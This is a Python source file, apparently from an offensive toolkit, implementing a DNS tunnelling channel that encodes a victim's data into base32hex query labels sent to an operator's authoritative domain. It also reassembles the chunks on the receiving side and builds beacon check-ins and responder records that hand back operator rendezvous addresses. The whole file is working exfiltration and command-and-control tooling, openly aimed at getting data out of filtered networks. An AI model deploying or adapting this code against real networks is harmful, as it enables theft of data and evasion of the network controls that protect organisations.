"""DNS exfiltration and beacon channel - data OUT over the names a resolver must send.

This is the channel you reach for when a victim's egress is filtered down to what
a locked-down network still allows: DNS. A stub resolver forwards a name it has
never seen, so anything encoded in that name leaves the network even when HTTP and
everything else is blocked. The operator runs an authoritative responder for one
campaign domain and reads the queries it receives.

LIMITS, up front:
  * SLOW - a single DNS name is capped near 253 characters, so one query carries
    tens of bytes, and a stub resolver will not stream hundreds of queries a
    second. Expect hundreds of bytes per second, not megabytes.
  * LOSSY - UDP queries are dropped under load; a chunk that never arrives leaves
    a gap, and this module REFUSES to hand back a partial payload rather than
    guess at what was missing.
  * CACHED - intermediate resolvers cache by name, coalesce identical queries and
    rate-limit. A unique name per chunk (what this module emits) avoids most of
    it, and an answer TTL of 0 keeps a resolver from holding the reply.
  * EXTREMELY VISIBLE - every query is logged by the stub resolver, the corporate
    DNS server and any passive-DNS collector. Long random-looking labels under one
    domain are the textbook tunnelling signature.

It exists for a victim whose egress is filtered, NOT as a primary channel. When
HTTP works, use HTTP.

The encoding is base32hex (RFC 4648 section 7): the alphabet 0-9a-v, lowercase,
NO padding, split into labels of at most 63 characters. The responder half is the
authoritative server in core.rebind; records_for() returns entries shaped exactly
like the query dict rebind.parse_query produces, so rebind.build_response can
answer a beacon straight from one (or the operator's own responder can).
"""
import base64
import hashlib
import secrets
import struct

__all__ = [
    "encode_labels", "decode_labels", "qname", "query_plan", "decode_session",
    "records_for", "beacon", "plan",
    "QTYPE_A", "QTYPE_AAAA", "QTYPE_TXT", "QCLASS_IN",
    "MAX_LABEL", "MAX_NAME", "MAX_CHUNKS", "BEACON_MARKER",
]

# DNS wire constants. Kept identical to core.rebind (QTYPE_A/QCLASS_IN) so a
# record built here is a record that responder already knows how to answer.
QTYPE_A = 1
QTYPE_AAAA = 28
QTYPE_TXT = 16
QCLASS_IN = 1

# RFC 1035: one label is at most 63 octets, and a full name is at most 253
# characters in presentation format (the labels joined by dots, plus the zone).
# A single NAME is capped at MAX_NAME by qname() and by query_plan's pagination,
# which is where a large payload is deliberately split across several queries.
MAX_LABEL = 63
MAX_NAME = 253

# The label/depth budget for ONE payload: how many base32hex labels encode_labels
# will produce before refusing. It is the unit query_plan paginates; a payload
# that needs more is refused up front with this number in the message, because a
# DNS name cannot carry an unbounded number of labels.
MAX_DEPTH = 8

# The largest chunk index a session may carry. The index is read from a query NAME, i.e.
# from whoever sends one, so it decides how much work the receiver does: without a cap,
# `1000000000.x.<zone>` builds a multi-gigabyte list and error message on the operator's
# box. 4096 chunks is about 160 KB of payload, far past anything this channel carries.
MAX_CHUNKS = 4096

# The plain label that heads a beacon query, so the operator can tell a beacon
# from exfil WITHOUT decoding: a beacon query's first label is this word, while an
# exfil query's first label is a decimal chunk index.
BEACON_MARKER = "beacon"
_BEACON_TAG = "beacon"

# How many times the planner assumes each query is sent. The receiver dedupes by
# chunk index, so a resend costs a query, never a corrupted payload.
DEFAULT_RETRIES = 2
# Answer TTL. 0 keeps an intermediate resolver from caching the reply.
DEFAULT_TTL = 0
# The per-query label depth the planner packs, and the same number encode_labels
# lets a payload reach before refusing.
DEFAULT_MAX_LABELS = MAX_DEPTH
# A stub resolver forwards a handful of names a second for one lookup; assuming
# hundreds would be the overclaim this module exists to avoid.
RESOLVER_QUERIES_PER_SECOND = 5


def _as_bytes(data):
    if isinstance(data, (bytes, bytearray)):
        return bytes(data)
    return str(data).encode("utf-8", "replace")


def _b32hex_encode(data):
    """RFC 4648 section 7 base32hex, normalised to lowercase with no padding."""
    return base64.b32hexencode(_as_bytes(data)).decode("ascii").lower().rstrip("=")


def _b32hex_decode(text):
    """The inverse of _b32hex_encode. Raises ValueError on anything else."""
    s = str(text)
    if not s:
        return b""
    up = s.upper()
    pad = (-len(up)) % 8
    try:
        return base64.b32hexdecode(up + "=" * pad)
    except Exception as e:
        raise ValueError(f"not valid base32hex ({len(s)} characters): {e}") from e


def _clean_zone(zone):
    z = str(zone or "").strip().strip(".").lower()
    if not z:
        raise ValueError(
            "a zone is required (the campaign domain the responder is authoritative for)")
    return z


def encode_labels(data):
    """Encode `data` into DNS labels of at most 63 characters each.

    The output is base32hex (RFC 4648 section 7), chunked at 63 characters, with
    NO padding and NO label longer than 63. The joined length plus the zone has to
    fit a 253-character name, so this refuses a payload that would not, and the
    error names the budget rather than reporting a bare failure.
    """
    raw = _b32hex_encode(data)
    if not raw:
        return []
    labels = [raw[i:i + MAX_LABEL] for i in range(0, len(raw), MAX_LABEL)]
    if len(labels) > MAX_DEPTH:
        raise ValueError(
            f"payload too large for the label budget: it needs {len(labels)} labels of up "
            f"to {MAX_LABEL} characters, but the budget is {MAX_DEPTH} labels "
            f"({MAX_DEPTH * MAX_LABEL} base32hex characters) per encode; split the payload "
            f"across beacons (a single name is capped at {MAX_NAME} characters)")
    return labels


def decode_labels(labels):
    """Decode DNS labels back to bytes - the exact inverse of encode_labels."""
    joined = "".join(str(label) for label in labels)
    return _b32hex_decode(joined)


def qname(data, zone):
    """The full query name for `data`: the encoded labels joined with '.', plus the zone."""
    z = _clean_zone(zone)
    name = ".".join(encode_labels(data) + [z])
    if len(name) > MAX_NAME:
        raise ValueError(
            f"name too long: {len(name)} characters, limit {MAX_NAME} "
            f"(reduce the payload or shorten the zone {z!r})")
    return name


def _labels_per_query(n_labels, zone, max_labels):
    """How many base32 labels to pack into one query name.

    One extra label is spent on the decimal chunk index, and the whole name must
    stay under MAX_NAME, so the depth cap `max_labels` and the character budget
    are both honoured; the smaller of the two wins.
    """
    if n_labels <= 1:
        return 1
    depth = max(1, int(max_labels))
    idx_width = len(str(n_labels))              # worst-case index width, so we never overflow
    room = MAX_NAME - idx_width - 1 - len(zone)  # characters left for "label." repeated
    fits = max(1, room // (MAX_LABEL + 1))
    return max(1, min(depth, fits))


def _build_qnames(labels, zone, per, prefix=None):
    """Group `labels` into query names, one group per query, prefixed if asked."""
    out = []
    for start in range(0, len(labels), per):
        group = labels[start:start + per]
        parts = ([prefix] if prefix else []) + [str(start // per)] + list(group) + [zone]
        name = ".".join(parts)
        if len(name) > MAX_NAME:
            raise ValueError(
                f"query name too long ({len(name)} > {MAX_NAME}): lower max_labels "
                f"or shorten the zone {zone!r}")
        out.append(name)
    return out


def query_plan(data, zone, *, max_labels=DEFAULT_MAX_LABELS):
    """The operator-facing plan for one payload: what to send and what loss costs.

    A query name is '<index>.<base32 labels...>.<zone>', so a resolver can answer
    it, the receiver can order and dedupe it by index, and a resend is harmless.
    """
    z = _clean_zone(zone)
    labels = encode_labels(data)
    per = _labels_per_query(len(labels), z, max_labels)
    qnames = _build_qnames(labels, z, per)
    bytes_per_query = MAX_LABEL * per * 5 // 8
    why = (
        f"{len(qnames)} query/queries carry {len(labels)} chunk(s) of base32hex, "
        f"up to {per} label(s) and about {bytes_per_query} bytes per query. The "
        f"receiver reassembles by chunk index, so a query may be sent {DEFAULT_RETRIES + 1} "
        f"times and duplicates cost queries, not data; a chunk that never arrives leaves a "
        f"gap and decode_session refuses to return a partial payload. Answers carry TTL "
        f"{DEFAULT_TTL}, so an intermediate resolver does not cache the reply.")
    return {
        "qnames": qnames,
        "chunks": len(labels),
        "bytes_per_query": bytes_per_query,
        "queries": len(qnames),
        "retries": DEFAULT_RETRIES,
        "ttl": DEFAULT_TTL,
        "why": why,
    }


def _split_body(name, zone_labels):
    """The labels of `name` that sit before `zone`, or None when it is not our zone."""
    labels = name.split(".") if name else []
    if len(labels) <= len(zone_labels):
        return None
    if labels[-len(zone_labels):] != zone_labels:
        return None
    body = labels[:-len(zone_labels)]
    if body and body[0] == BEACON_MARKER:       # a beacon carries the marker up front
        body = body[1:]
    return body


def decode_session(queries, zone):
    """Reassemble a payload from the query names a resolver actually saw.

    `queries` is every name the receiver logged, in arrival order. Duplicates and
    retries are expected: a chunk index is kept once (the first arrival wins) and
    the payload is rebuilt in INDEX order, not arrival order. A name outside the
    zone is other traffic and is ignored. A missing index is a real gap, so this
    raises rather than return a silently partial payload.
    """
    z = _clean_zone(zone)
    zlabels = z.split(".")
    chunks = {}
    for raw in queries:
        name = str(raw or "").strip(".").lower()
        body = _split_body(name, zlabels)
        if not body:
            continue
        try:
            index = int(body[0], 10)
        except ValueError:
            continue                            # not an indexed chunk of our channel
        chunks.setdefault(index, body[1:])      # first arrival wins; a retry is identical
    if not chunks:
        raise ValueError(f"no queries for zone {z!r} were seen: nothing to reassemble")
    top = max(chunks)
    if top >= MAX_CHUNKS:
        raise ValueError(
            f"chunk index {top} is over the {MAX_CHUNKS} cap: a session that large is not "
            f"this channel (refusing to build it)")
    missing = [i for i in range(top + 1) if i not in chunks]
    if missing:
        shown = ", ".join(str(i) for i in missing[:8])
        more = f" and {len(missing) - 8} more" if len(missing) > 8 else ""
        raise ValueError(
            f"the session is missing {len(missing)} chunk index(es) of 0..{top} "
            f"(first: {shown}{more}): refusing to return a partial payload "
            f"(ask for a resend of the missing chunk(s))")
    joined = "".join("".join(chunks[i]) for i in range(top + 1))
    return _b32hex_decode(joined)


def _addresses_from_store(store, name):
    """The operator address(es) `store` holds for `name`.

    `store` may be a bare address string, a list of them, or a mapping that holds
    one under `name`, `'answer'`, `'address'` or `'*'`. A missing address is not
    an error: it just means the responder answers the beacon with no record.
    """
    if store is None:
        return []
    value = store
    if isinstance(store, dict):
        for key in (name, "answer", "address", "*"):
            if key in store:
                value = store[key]
                break
        else:
            return []
    if isinstance(value, dict):
        for key in ("answer", "address"):
            if key in value:
                value = value[key]
                break
        else:
            return []
    if isinstance(value, (list, tuple)):
        return [str(v) for v in value if v]
    return [str(value)] if str(value) else []


def _query_id(name):
    """A stable 16-bit query id, so two records for the same name share one id."""
    digest = hashlib.sha256(name.encode("ascii", "replace")).digest()
    return struct.unpack("!H", digest[:2])[0]


def _question_bytes(name, qtype, qclass):
    """The question section a query with this name/type/class would carry.

    Mirrors core.rebind._encode_name's wire layout, so rebind.parse_query reads
    these bytes back to the same name and rebind.build_response can echo them.
    """
    out = b""
    for label in str(name).split("."):
        if not label:
            continue
        out += bytes([len(label)]) + label.encode("ascii", "ignore")
    out += b"\x00"
    return out + struct.pack("!HH", int(qtype), int(qclass))


def records_for(qname_seen, store):
    """The records the authoritative responder serves for a beacon it just saw.

    Each record carries exactly the fields core.rebind reads off a parsed query
    (id, name, qtype, qclass, flags, question - rebind.parse_query, lines 99-100,
    read back by rebind.build_response), plus 'answer', the operator address the
    responder hands back. One record per address; an empty address still yields a
    record, so the responder can acknowledge a beacon with no answer rather than
    stay silent.
    """
    name = str(qname_seen or "").strip().strip(".").lower()
    if not name:
        raise ValueError("records_for needs the query name the responder saw")
    records = []
    for addr in _addresses_from_store(store, name):
        qtype = QTYPE_AAAA if ":" in addr else QTYPE_A
        records.append({
            "id": _query_id(name),
            "name": name,
            "qtype": qtype,
            "qclass": QCLASS_IN,
            "flags": 0x0100,                    # RD set, like a stub resolver's own query
            "question": _question_bytes(name, qtype, QCLASS_IN),
            "answer": addr,
        })
    if not records:
        records.append({
            "id": _query_id(name),
            "name": name,
            "qtype": QTYPE_A,
            "qclass": QCLASS_IN,
            "flags": 0x0100,
            "question": _question_bytes(name, QTYPE_A, QCLASS_IN),
            "answer": "",
        })
    return records


def beacon(data, zone, *, nonce=None):
    """A named, nonce-tagged beacon: a check-in the operator can tell from exfil.

    The payload is 'beacon:<nonce>:<data>' before encoding, and the query names
    are headed by the plain label BEACON_MARKER, so a beacon is recognisable both
    on the wire (the leading label) and after decode (the tag). Everything else
    is the same indexed, resumable shape query_plan emits.
    """
    z = _clean_zone(zone)
    nonce = str(nonce) if nonce is not None else secrets.token_hex(8)
    payload = (_BEACON_TAG.encode("ascii") + b":"
               + nonce.encode("ascii", "replace") + b":"
               + _as_bytes(data))
    labels = encode_labels(payload)
    per = _labels_per_query(len(labels), z, DEFAULT_MAX_LABELS)
    qnames = _build_qnames(labels, z, per, prefix=BEACON_MARKER)
    return {
        "kind": "beacon",
        "marker": BEACON_MARKER,
        "nonce": nonce,
        "zone": z,
        "payload": payload,
        "qnames": qnames,
    }


def plan():
    """The capability table, as data, for the operator to read and check."""
    per_query = MAX_LABEL * 5 // 8              # one 63-character label carries 39 bytes
    rate = RESOLVER_QUERIES_PER_SECOND
    return {
        "channel": "dns",
        "needs": ("only OUTBOUND DNS from the victim: UDP/53 (or TCP/53, or DoH over 443). "
                  "No inbound port and no HTTP egress are required"),
        "bytes_per_query": per_query,
        "resolver_rate_queries_per_second": rate,
        "bytes_per_second": per_query * rate,
        "query_types": [
            {"qtype": "TXT",
             "bytes_per_query": "name-side only, about 39",
             "why": ("TXT may carry any text, but the exfil direction is the query NAME, "
                     "still capped near 253 characters; TXT only enlarges the ANSWER, "
                     "which is the operator's side, not the victim's")},
            {"qtype": "A", "bytes_per_query": 4,
             "why": "an A answer returns one IPv4 address (4 bytes) - the operator's rendezvous"},
            {"qtype": "AAAA", "bytes_per_query": 16,
             "why": "an AAAA answer returns one IPv6 address (16 bytes)"},
        ],
        "caching": ("intermediate resolvers cache by name and coalesce identical queries; "
                    "this channel uses a UNIQUE name per chunk so nothing is reused, and the "
                    f"answer TTL is {DEFAULT_TTL} so a resolver does not hold the reply"),
        "retries": (f"assume {DEFAULT_RETRIES} resends per query; duplicates and reordering are "
                    "expected and decode_session dedupes by chunk index and rebuilds by index"),
        "ttl": DEFAULT_TTL,
        "lossy": ("UDP drops queries under load; a missing chunk index aborts the reassembly "
                  "instead of returning a partial payload"),
        "visible": ("every query is logged by the stub resolver, the corporate DNS server and "
                    "any passive-DNS collector; long random labels under one domain are the "
                    "textbook tunnelling signature"),
        "why": ("DNS egress is allowed in networks that block everything else, so it is the one "
                "channel a filtered host can still use; it is a slow, lossy fallback, not a "
                "primary channel"),
    }
